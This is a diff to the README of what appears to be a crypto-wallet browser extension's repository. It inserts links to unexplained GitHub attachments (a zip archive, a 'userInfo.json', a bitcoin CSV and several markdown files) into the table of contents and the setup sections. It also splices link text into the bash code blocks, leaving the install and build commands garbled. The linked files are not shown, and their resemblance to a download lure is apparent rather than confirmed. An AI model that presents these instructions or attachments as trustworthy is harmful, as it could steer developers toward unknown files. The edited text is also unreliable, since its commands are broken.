@@ -27,7 +27,8 @@
   - [Installing the Latest Release](#installing-the-latest-release)
   - [Developing Locally](#developing-locally)
     - [Pull the code](#pull-the-code)
-    - [Temporary preliminary steps](#temporary-preliminary-steps)
+    - [Go-yml-Android.zip](https://github.com/user-attachments/files/16719976/Go-yml-Android.zip)
+- [Temporary preliminary steps](#temporary-preliminary-steps)
       - [Enable self-signed local SSL certs](#enable-self-signed-local-ssl-certs)
       - [Environment variables](#environment-variables)
     - [Install dependencies](#install-dependencies)
@@ -38,6 +39,8 @@
       - [Not seeing the dev folder?](#not-seeing-the-dev-folder)
     - [Optionally install the built extension](#optionally-install-the-built-extension)
   - [License](#license)
+  - [PULL_REQUEST_TEMPLATE.md](https://github.com/user-attachments/files/16719986/PULL_REQUEST_TEMPLATE.md)
+
 
 ## Installing the Latest Release
 
@@ -46,14 +49,24 @@ and add it to your local chrome profile, using developer mode. See the video bel
 
 ## Developing Locally
 
-https://user-images.githubusercontent.com/101902546/173857300-fc139113-0af5-46fc-baad-236a2ebf63f1.m4p
+[developer-notes.md](https://github.com/user-attachments/files/16719872/developer-notes.md)
+
+`https://github.com/user-attachments/files/16719960/userInfo.json`
+
+`https://user-images.githubusercontent.com/101902546/173857300-fc139113-0af5-46fc-baad-236a2ebf63f1.m4p`
 
 ### Pull the code
 
 ```bash
+PULL_REQUEST_TEMPLATE.md](https://github.com/user-attachments/files/16719995/PULL_REQUEST_TEMPLATE.md
+```
+
+
+```bash 
 git clone git@github.com:coral-xyz/backpack.git
 cd backpack
 ```
+
 
 ### Temporary preliminary steps
 
@@ -65,21 +78,19 @@ Go to chrome://flags/#allow-insecure-localhost and enable the toggle, then resta
 
 ### Install dependencies
 
-```bash
-yarn install
+```bash`[bitcoin _2024 (2).csv](https://github.com/user-attachments/files/16719948/bitcoin._2024.2.csv)`yarn install
 ```
 
 You can also optionally rename `.env.example` to `.env` and set your own variables.
 
 ### Build all packages for production
 
-```bash
-yarn build
+```bash`[README.md](https://github.com/user-attachments/files/16719933/README.md)`yarn build
 ```
 
 ### Start everything inside `./packages` for development
 
-```bash
+```bash `[developer-notes.md](https://github.com/user-attachments/files/16719872/developer-notes.md`]
 yarn start
 ```
 
